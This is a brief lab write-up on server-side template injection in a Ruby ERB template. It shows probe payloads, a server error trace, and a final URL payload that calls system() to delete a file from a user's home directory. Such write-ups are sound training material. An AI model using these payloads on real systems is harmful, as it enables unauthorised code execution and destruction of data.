
# Description

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

# Solution

It is ERB template enginge, so try payloads for erb

```
<%= foobar %>
```

output

```
#### Internal Server Error

(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError) from /usr/lib/ruby/2.7.0/erb.rb:905:in `eval' from /usr/lib/ruby/2.7.0/erb.rb:905:in `result' from -e:4:in `<main>'
```


request
```
<%= 7*7 %>
```

relust
```
49
```

Indeed this web suffers from SSTI

## Final payload

```
https://0a1100de048abf1282f7b5b40084008a.web-security-academy.net/?message=<%= system('rm /home/carlos/morale.txt') %>
```

